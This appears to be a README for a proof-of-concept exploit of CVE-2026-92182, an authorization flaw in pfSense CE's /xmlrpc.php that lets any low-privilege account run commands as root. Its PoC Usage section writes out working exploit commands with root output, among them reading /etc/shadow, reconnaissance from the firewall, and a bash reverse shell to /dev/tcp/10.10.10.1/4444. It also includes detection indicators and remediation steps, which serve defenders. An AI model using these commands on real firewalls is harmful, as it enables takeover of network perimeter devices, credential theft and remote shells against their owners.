<div align="center">

# CVE-2026-92182

### pfSense CE — XMLRPC Incorrect Authorization to Root RCE


</div>

---

## Overview

pfSense CE's XMLRPC endpoint (`/xmlrpc.php`) exposes privileged PHP execution methods — including `pfsense.exec_php` and `pfsense.exec_shell` — to any authenticated account, regardless of role. The method dispatcher does not enforce the admin role before dispatch. Because the pfSense web UI process runs as root, any low-privilege account holder can invoke these methods to execute arbitrary shell commands as `root` on the firewall host.

| Field | Value |
|---|---|
| **CVE** | CVE-2026-92182 |
| **CVSS 3.1** | `8.8 High` — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-863 (Incorrect Authorization) |
| **Affected** | pfSense CE ≤ 2.8.1 |
| **Fixed** | pfSense CE 2.8.2 / pfSense-SA-26_22 |
| **ZDI** | [ZDI-26-960](https://www.zerodayinitiative.com/advisories/ZDI-26-960/) |
| **Auth Required** | Low — any valid pfSense account (even read-only) |
| **Dependencies** | None — Python stdlib only (`urllib`, `xml.etree`) |
| **Disclosed** | 2026-11-18 |

---

## Vulnerability Details

`/xmlrpc.php` accepts HTTP Basic authentication and dispatches to named methods in the `pfsense.*` namespace. The dispatcher checks only that the caller supplies **the correct password** for the authenticating account, not that the account holds the `admin` role. Any valid local account — including monitoring or read-only accounts — can reach `pfsense.exec_php` and inject arbitrary PHP executed under the web server UID (`root`).

The affected admin-only methods:

| Method | Effect |
|---|---|
| `pfsense.exec_php` | Execute arbitrary PHP as root (supports `ob_start()` output capture) |
| `pfsense.exec_shell` | Execute a raw shell command string |
| `pfsense.backup_config_section` | Read config sections (information disclosure) |
| `pfsense.get_installed_packages` | Read installed package list (information disclosure) |

---

## Attack Flow

```mermaid
flowchart LR
    A([Attacker\nLow-privilege account]) -->|POST /xmlrpc.php\nHTTP Basic Auth\npfsense.exec_php| B[pfSense CE ≤ 2.8.1]
    B -->|Method dispatcher:\npassword check only\nno role check| C[exec_php handler]
    C -->|system&#40;'id; uname -a'&#41;| D[root shell\non firewall host]
    D --> E([Full firewall control\nNAT · VPN · routing · pivot])

    style A fill:#3d1a1a,stroke:#f85149,color:#f85149
    style D fill:#1a1f2e,stroke:#f85149,color:#f85149
    style E fill:#1a1f2e,stroke:#58a6ff,color:#58a6ff
```



---

## PoC Usage

> **Warning:** Authorized testing and isolated lab environments only. Never run against production firewalls.

### Setup

No external dependencies — uses Python standard library only:

```bash
python3 --version  # Python 3.6+ required
# No pip install needed
```

### Probe — test which admin methods are reachable

Scan the target to determine which privileged methods a low-privilege account can reach:

```bash
python3 poc.py \
    -t https://pfsense.example.com \
    -u lowpriv \
    -p mypassword \
    --probe
```

Expected output — vulnerable build:
```
[*] target: https://pfsense.example.com  user: lowpriv
[*] probing admin-only XMLRPC methods...
    [+] REACHABLE  pfsense.exec_php    HTTP 200
    [+] REACHABLE  pfsense.exec_shell  HTTP 200
    [-] blocked/fault  pfsense.backup_config_section  HTTP 200
    [-] blocked/fault  pfsense.get_installed_packages  HTTP 200

[!] VULNERABLE — 2 admin method(s) reachable as 'lowpriv'
```

Expected output — patched build:
```
[*] probing admin-only XMLRPC methods...
    [-] blocked/fault  pfsense.exec_php    HTTP 403
    [-] blocked/fault  pfsense.exec_shell  HTTP 403
    [-] blocked/fault  pfsense.backup_config_section  HTTP 403
    [-] blocked/fault  pfsense.get_installed_packages  HTTP 403

[+] no admin methods reached — target may be patched
```

### Execute a shell command as root

```bash
# Basic identity check
python3 poc.py \
    -t https://pfsense.example.com \
    -u lowpriv \
    -p mypassword \
    --exec 'id; uname -a'

# Read sensitive files
python3 poc.py \
    -t https://pfsense.example.com \
    -u lowpriv \
    -p mypassword \
    --exec 'cat /etc/shadow | head -5'

# Network reconnaissance from the firewall
python3 poc.py \
    -t https://pfsense.example.com \
    -u lowpriv \
    -p mypassword \
    --exec 'ifconfig && netstat -rn'

# Reverse shell (replace IP/port with your listener)
python3 poc.py \
    -t https://pfsense.example.com \
    -u lowpriv \
    -p mypassword \
    --exec 'bash -c "bash -i >& /dev/tcp/10.10.10.1/4444 0>&1"'
```

Expected output for `--exec 'id; uname -a'`:
```
[*] target: https://pfsense.example.com  user: lowpriv
[*] exec via pfsense.exec_php: 'id; uname -a'
    HTTP 200
    output: uid=0(root) gid=0(wheel) groups=0(wheel)
            FreeBSD pfsense.example.com 14.1-RELEASE-p3
```

### Admin comparison — verify the same call works as admin

Confirm that the admin path is equivalent (proves the low-priv path uses the same code, not a separate bypass):

```bash
python3 poc.py \
    -t https://pfsense.example.com \
    -u lowpriv \
    -p mypassword \
    --admin \
    --exec 'id'
```

Output:
```
[*] exec via pfsense.exec_php: 'id'
    HTTP 200
    output: uid=0(root) gid=0(wheel) groups=0(wheel)
[*] admin comparison call:
    HTTP 200  output: uid=0(root) gid=0(wheel) groups=0(wheel)
```

Both return identical output — confirming the authorization check is absent, not bypassed differently.

### Available flags

| Flag | Description |
|---|---|
| `-t URL` | pfSense base URL including scheme (required) |
| `-u USER` | pfSense username |
| `-p PASS` | pfSense password |
| `--probe` | Test which admin XMLRPC methods are reachable |
| `--exec CMD` | Execute `CMD` via `pfsense.exec_php` as root |
| `--admin` | Also run the same call authenticating as "admin" for comparison |

### Technical notes

- Uses `urllib` + `xml.etree.ElementTree` — no `requests` dependency.
- TLS certificate verification is disabled (`ssl.CERT_NONE`) for self-signed certs typical on pfSense — do not use in environments where MITM is a concern.
- PHP output capture relies on `ob_start()`. Some method implementations suppress output; `--exec` may return empty string on those.
- The `--admin` flag requires knowing the admin password; use it only for authorized comparison testing.

---

## Detection

| Indicator | Notes |
|---|---|
| POST to `/xmlrpc.php` from non-admin account | Web server log: `POST /xmlrpc.php` with non-admin credentials |
| `pfsense.exec_php` or `pfsense.exec_shell` in log | XML body parsing: look for method names in POST data |
| `php` process spawning unexpected children | IDS/EDR on the firewall: `php` → `sh` → `bash`/`nc` process tree |
| Outbound connections from firewall host | Unexpected TCP originating from firewall IP to external hosts |

---

## Impact

Root RCE on the network's perimeter device. A compromised firewall can:
- Be pivoted to reach all network segments it controls
- Intercept VPN credentials and plaintext traffic
- Manipulate NAT / firewall rules silently
- Exfiltrate configuration including IPsec pre-shared keys
- Persist across reboots by modifying `/cf/conf/config.xml`

---

## Remediation

Upgrade to **pfSense CE 2.8.2** or apply **pfSense-SA-26_22**. The fix adds a role check before the XMLRPC method dispatcher allows privileged method invocation.

| Action | Detail |
|---|---|
| Upgrade pfSense | CE 2.8.2 from netgate.com |
| Apply security advisory | pfSense-SA-26_22 |
| Block `/xmlrpc.php` | Firewall rule to restrict access to management VLAN only |
| Rotate all accounts | Rotate passwords for all pfSense local accounts |
| Audit XMLRPC logs | Search web server logs for non-admin `exec_php` / `exec_shell` calls |

---

## Limitations

- Uses stdlib only (`urllib`, `xml.etree`) — no `requests` required.
- PHP output capture relies on `ob_start()`; some method implementations suppress output.
- TLS certificate verification is disabled (`CERT_NONE`) for self-signed certs typical on pfSense.
- The admin comparison (`--admin`) requires the admin password to be known or guessed.

---

## References

- ZDI-26-960: https://www.zerodayinitiative.com/advisories/ZDI-26-960/
- pfSense-SA-26_22: https://docs.netgate.com/pfsense/en/latest/security/advisories/
- CVE Record: https://www.cve.org/CVERecord?id=CVE-2026-92182

---

> **Disclaimer:** For authorized security research and controlled lab use only. MIT License.
